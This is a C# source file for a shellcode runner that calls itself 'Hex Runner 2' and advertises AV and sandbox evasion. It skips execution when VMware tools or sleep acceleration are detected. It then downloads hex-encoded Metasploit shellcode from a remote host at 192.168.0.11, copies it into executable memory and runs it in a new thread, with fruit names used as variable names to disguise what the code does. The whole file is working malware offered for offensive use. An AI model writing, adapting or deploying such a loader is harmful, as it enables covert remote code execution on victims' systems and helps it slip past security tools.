using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

/*
Hex Runner 2, Electric Boogaloo. Includs AV evasion and sandbox evasion techniques.
msf -f hex > helloworld.txt
Won't run in a VMware VM due to sandbox evasion.
*/

namespace Runner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
            );

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(
            IntPtr lpCallback
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32
            flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred
            );

        [DllImport("kernel32.dll")]
        static extern void Sleep(
            uint dwMilliseconds
            );

        public static byte[] FromHex(string hex)
        {
            hex = hex.Replace("-", "");
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }
        static bool DoubleCheck()
        {
            Process[] proc = Process.GetProcessesByName("vmtoolsd");
            if (proc.Length > 0)
            {
                return false;
            }
            DateTime apples = DateTime.Now;
            Sleep(3000);
            double oranges = DateTime.Now.Subtract(apples).TotalSeconds;
            if (oranges < 2.0)
            {
                return false;
            }
            return true;
        }

            static void Main(string[] args)
            {

                if (false == DoubleCheck())
                {
                    return;
                }

                WebClient req = new WebClient();
                string pineapple = req.DownloadString("http://192.168.0.11/helloworld.txt");
                byte[] pear = FromHex(pineapple);

                int banana = pear.Length;

                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
                Marshal.Copy(pear, 0, addr, banana);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

            }
        }
    }
